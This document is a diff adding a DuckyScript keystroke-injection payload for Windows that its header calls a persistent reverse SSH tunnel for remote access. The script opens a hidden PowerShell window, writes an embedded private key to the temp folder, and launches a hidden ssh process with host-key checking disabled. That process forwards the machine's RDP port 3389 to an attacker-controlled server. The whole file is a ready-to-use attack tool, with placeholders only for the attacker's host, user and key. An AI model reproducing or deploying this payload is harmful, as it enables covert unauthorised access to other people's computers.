@@ -1,0 +1,35 @@
+REM Author: UNC0V3R3D
+REM Description: Establishes a persistent reverse SSH tunnel using OpenSSH client.
+REM Version: 1.0
+REM Category: Remote-Access
+REM Target: Windows 10/11 (OpenSSH client must be installed)
+REM Requirements: SSH server on attacker machine, pre-deployed SSH key or password
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING $sshUser = 'SSH_USERNAME'
+ENTER
+DELAY 400
+STRING $sshHost = 'SSH_SERVER_IP'
+ENTER
+STRING $remotePort = 'REMOTE_PORT'
+ENTER
+STRING $keyPath = "$env:TEMP\id_rsa"
+ENTER
+STRING $keyContent = 'SSH_PRIVATE_KEY_BASE64'
+ENTER
+STRING [System.Convert]::FromBase64String($keyContent) | Set-Content $keyPath -Encoding Byte
+ENTER
+STRING icacls $keyPath /inheritance:r /grant:r "${env:USERNAME}:(R)" | Out-Null
+ENTER
+STRING $args = "-i `"$keyPath`" -o StrictHostKeyChecking=no -N -R ${remotePort}:localhost:3389 ${sshUser}@${sshHost}"
+ENTER
+STRING Start-Process ssh -ArgumentList $args -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+REM End of payload
